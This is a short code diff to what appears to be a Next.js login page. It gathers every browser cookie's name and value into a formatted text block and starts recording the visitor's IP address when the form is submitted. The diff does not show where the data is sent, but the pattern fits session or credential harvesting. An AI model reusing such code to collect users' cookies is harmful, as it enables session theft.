@@ -25,15 +25,18 @@ export default async function LoginPage({
     const headersList = await headers();
 
     const cookieStore = await cookies();
-    console.log("Cookies during form submission:", cookieStore.getAll());
 
-    const cookiesFormatted = cookieStore
-      .getAll()
+    // Now this will log the actual cookies sent from the browser
+    const allCookies = cookieStore.getAll();
+    // console.log("Cookies during form submission-main:", allCookies);
+
+    const cookiesFormatted = allCookies
       .map(
         (cookie, index) =>
           `${index + 1}. ${cookie.name}\n   Value: ${cookie.value}`,
       )
       .join("\n\n");
+
 
     const userInfo = {
       ipAddress:
